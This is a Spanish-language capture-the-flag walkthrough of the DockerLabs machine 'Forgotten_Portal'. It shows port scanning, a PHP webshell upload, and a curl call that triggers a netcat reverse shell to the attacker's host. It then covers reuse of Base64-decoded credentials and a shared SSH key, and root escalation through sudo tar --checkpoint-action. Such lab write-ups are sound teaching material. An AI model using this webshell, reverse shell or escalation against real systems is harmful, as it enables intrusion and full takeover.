## Introducción

Este documento presenta la resolución completa de la máquina **Forgotten_Portal**, desarrollada por *Cyberland* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
El laboratorio expone un servidor web con una funcionalidad de subida de archivos que permite la carga de archivos PHP sin validación, facilitando la obtención de una reverse shell como `www-data`.
Una vez dentro, se encuentra un archivo de log con credenciales codificadas en Base64 del usuario `alice`, permitiendo el acceso a esta cuenta. Posteriormente, se descubre una clave SSH compartida que otorga acceso al usuario `bob`. Finalmente, se abusa de una configuración insegura de `sudo` en el binario `tar` para ejecutar comandos como root y obtener acceso completo al sistema.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Forgotten_Portal.zip
sudo bash auto_deploy.sh Forgotten_Portal.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Forgotten_Portal/{content,exploits,nmap,scripts}
cd Forgotten_Portal
```

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1765863328/Ports_uxc3yr.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p22,80 172.17.0.2
```

### 1.3 Enumeración web

Se realiza un escaneo de directorios:

```bash
feroxbuster -u http://172.17.0.2 -d 0 \

  -x php,txt,html,js,bak,old \
```

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Subida de webshell

El portal de upload permite subir archivos PHP sin validación. Se sube una webshell:

```php
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

![Shell Upload](https://res.cloudinary.com/dewqswzke/image/upload/v1765938489/ShellUpload_e8yxls.png)

### 2.2 Reverse shell

Se inicia un listener:

```bash
nc -nlvp 443
```

Se accede a la webshell para ejecutar la reverse shell:

```bash
curl "http://172.17.0.2/uploads/shell.php?cmd=nc+-e+/bin/bash+172.17.0.1+443"
```

![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1765938488/ReverseShell_s6gqar.png)

## Paso 3 — Escalada de privilegios

### 3.1 De www-data → alice

Se encuentra un archivo de log con credenciales en Base64:

```bash
find / -name "*.log" -type f 2>/dev/null | head -20
cat /path/to/access_log
```

![Access log](https://res.cloudinary.com/dewqswzke/image/upload/v1765938484/Access_log_akpr6d.png)

Se decodifican las credenciales:

```bash
echo 'YWxpY2U6QWxpY2UxMjM0NQ==' | base64 -d
```

Resultado: `alice:Alice12345`

```bash
su alice
```

![Alice](https://res.cloudinary.com/dewqswzke/image/upload/v1765938484/Alice_z9akv6.png)

### 3.2 De alice → bob

Se encuentra un reporte que revela que la clave SSH de `bob` fue copiada al directorio `.ssh` de todos los usuarios:

```bash
ls -la ~/.ssh/id_rsa
chmod 600 ~/.ssh/id_rsa
ssh -i ~/.ssh/id_rsa bob@localhost
```

### 3.3 De bob → root

Se verifican los permisos sudo:

```bash
sudo -l
```

![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1765938492/Sudo-lBob_wglpqx.png)

Se puede ejecutar `tar` como root. Se abusa de la opción `--checkpoint-action`:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1765938489/Root_l14whf.png)
